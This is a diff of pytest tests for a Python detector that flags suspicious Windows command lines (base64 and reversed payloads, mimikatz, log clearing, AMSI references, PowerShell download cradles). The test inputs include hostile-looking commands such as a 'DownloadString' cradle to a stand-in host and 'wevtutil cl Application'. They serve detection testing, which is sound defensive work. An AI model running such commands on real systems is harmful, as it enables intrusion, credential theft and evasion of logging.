@@ -1,60 +1,136 @@
 import pytest
+from typing import Tuple
 from CommandLineAnalysis import (
-    analyze_command_line,
-    check_malicious_commands,
-    clean_non_base64_chars,
-    decode_base64,
     is_base64,
+    clean_non_base64_chars,
+    remove_null_bytes,
+    decode_base64,
+    identify_and_decode_base64,
+    reverse_command,
+    check_malicious_commands,
+    check_reconnaissance_temp,
+    check_windows_temp_paths,
+    check_suspicious_content,
+    check_amsi,
+    check_mixed_case_powershell,
+    check_powershell_suspicious_patterns,
+    analyze_command_line
 )
 
 
-@pytest.mark.parametrize("input_str, expected", [
-    ("VGVzdCBzdHJpbmc=", True),  # Valid Base64
-    ("VGVzdCBzdHJpbmc==", True),  # Valid Base64 with padding
-    ("InvalidBase64", False),  # Invalid characters
-    ("TooShort==", False),  # Too short to be valid
-])
-def test_is_base64(input_str, expected):
-    assert is_base64(input_str) == expected
+# Test data
+DOUBLE_ENCODED_STRING = "UmVjdXJzaXZlIGRlY29kZSBvZiBkMlVnZDJGdWRDQjBieUJrWldOdlpHVWdhWFFnVmtkb2NHTjVRbkJqZVVKb1NVaFNiR016VVdkak0xSjVZVmMxYmc9PQ=="
+MALICIOUS_COMMAND_LINE = "wevtutil cl Application VGhpcyBpcyBhIGxpc3RlbmVyKDExLjEwMS4xMjQuMjIp"
+
+@pytest.fixture
+def sample_encoded_command() -> str:
+    return DOUBLE_ENCODED_STRING
+
+@pytest.fixture
+def sample_malicious_command() -> str:
+    return MALICIOUS_COMMAND_LINE
 
 
-@pytest.mark.parametrize("input_str, expected", [
-    ("aGVsbG8@#", "aGVsbG8"),
-    ("dGVzdA**==", "dGVzdA=="),
-    ("123+=456/=", "123=456="),
-])
-def test_clean_non_base64_chars(input_str, expected):
-    assert clean_non_base64_chars(input_str) == expected
+# Test is_base64
+def test_is_base64():
+    valid_base64 = "VGVzdFN0cmluZw=="
+    invalid_base64 = "ThisIsNotBase64"
+
+    assert is_base64(valid_base64) is True
+    assert is_base64(invalid_base64) is False
 
 
-@pytest.mark.parametrize("input_str, expected", [
-    ("VGVzdA==", "Test"),
-    ("VGVzdCBzdHJpbmc=", "Test string"),
-    ("InvalidBase64", None),
-])
-def test_decode_base64(input_str, expected):
-    result, _ = decode_base64(input_str)
-    assert result == expected
+# Test clean_non_base64_chars
+def test_clean_non_base64_chars():
+    dirty_base64 = "VGhpcyBpcyBub3QhQC0AIDwgYmFzZTY0"
+    cleaned_base64 = clean_non_base64_chars(dirty_base64)
+    assert cleaned_base64 == "VGhpcyBpcyBub3QAIDwgYmFzZTY0"
 
 
-def test_decode_base64_recursive():
-    encoded = "UmVjdXJzaXZlIGRlY29kZSBvZiBkMlVnZDJGdWRDQjBieUJrWldOdlpHVWdhWFFnVmtkb2NHTjVRbkJqZVVKb1NVaFNiR016VVdkak0xSjVZVmMxYmc9PQ=="
-
-    decoded, _ = decode_base64(encoded)
-    assert "Test string" in decoded  # Confirm the content
-
-
-@pytest.mark.parametrize("command_line, expected", [
-    ("mimikatz && procdump.exe", ["mimikatz", "procdump.exe"]),
-    ("ipconfig && netstat", ["ipconfig", "netstat"]),
-    ("InvalidCommand", []),
-])
-def test_check_malicious_commands(command_line, expected):
-    assert check_malicious_commands(command_line) == expected
+# Test remove_null_bytes
+def test_remove_null_bytes():
+    string_with_nulls = "test\x00string\x00"
+    assert remove_null_bytes(string_with_nulls) == "teststring"
 
 
+# Test decode_base64
+def test_decode_base64(sample_encoded_command):
+    decoded_str, double_encoded = decode_base64(sample_encoded_command)
+    assert "Recursive decode" in decoded_str
+    assert double_encoded is True
+
+
+# Test identify_and_decode_base64
+def test_identify_and_decode_base64(sample_malicious_command):
+    decoded_command, is_double_encoded = identify_and_decode_base64(sample_malicious_command)
+    assert decoded_command == "This is a listener(11.101.124.22)"
+    assert is_double_encoded is False
+
+
+# Test reverse_command
+def test_reverse_command():
+    reversed_string = "llehsrewoP"
+    result, was_reversed = reverse_command(reversed_string)
+    assert result == "PowerShell"
+    assert was_reversed is True
+
+
+# Test check_malicious_commands
+def test_check_malicious_commands():
+    command = "Invoke-Expression mimikatz"
+    matches = check_malicious_commands(command)
+    assert "mimikatz" in matches
+
+
+# Test check_reconnaissance_temp
+def test_check_reconnaissance_temp():
+    command = "ipconfig /all netstat -ano"
+    matches = check_reconnaissance_temp(command)
+    assert "ipconfig" in matches
+    assert "netstat -ano" in matches
+
+
+# Test check_windows_temp_paths
+def test_check_windows_temp_paths():
+    command = "C:\\Temp\\test.txt %TEMP%\\malware.exe"
+    matches = check_windows_temp_paths(command)
+    assert "C:\\Temp" in matches
+    assert "%TEMP%" in matches
+
+
+# Test check_suspicious_content
+def test_check_suspicious_content():
+    command = "powershell -enc Y2FsYy5leGU= -WindowStyle Hidden"
+    matches = check_suspicious_content(command)
+    assert "-enc" in matches
+    assert "-WindowStyle Hidden" in matches
+
+
+# Test check_amsi
+def test_check_amsi():
+    command = "System.Management.Automation.AmsiUtils"
+    matches = check_amsi(command)
+    assert "System.Management.Automation.AmsiUtils" in matches
+
+
+# Test check_mixed_case_powershell
+def test_check_mixed_case_powershell():
+    command = "PoWeRShElL -NoProfile"
+    matches = check_mixed_case_powershell(command)
+    assert "PoWeRShElL" in matches
+
+
+# Test check_powershell_suspicious_patterns
+def test_check_powershell_suspicious_patterns():
+    command = "powershell -Command (New-Object Net.WebClient).DownloadString('http://malicious')"
+    matches = check_powershell_suspicious_patterns(command)
+    assert "DownloadString" in matches
+
+
+# Test analyze_command_line
 def test_analyze_command_line():
-    command_line = "VGVzdA== && mimikatz"
-    results = analyze_command_line(command_line)
-    assert "mimikatz" in results["analysis"]["original"]["malicious_commands"]
-    assert results["analysis"]["original"]["base64_encoding"] == "Test"
+    result = analyze_command_line(MALICIOUS_COMMAND_LINE)
+    assert result["risk"] == "Medium Risk"
+    assert "VGhpcyBpcyBhIGxpc3RlbmVyKDExLjEwMS4xMjQuMjIp" in result["analysis"]["original"]["base64_encoding"]
+    assert "This is a listener(11.101.124.22)" in result["decoded_command"]
+    assert "wevtutil cl Application" in result["original_command"]
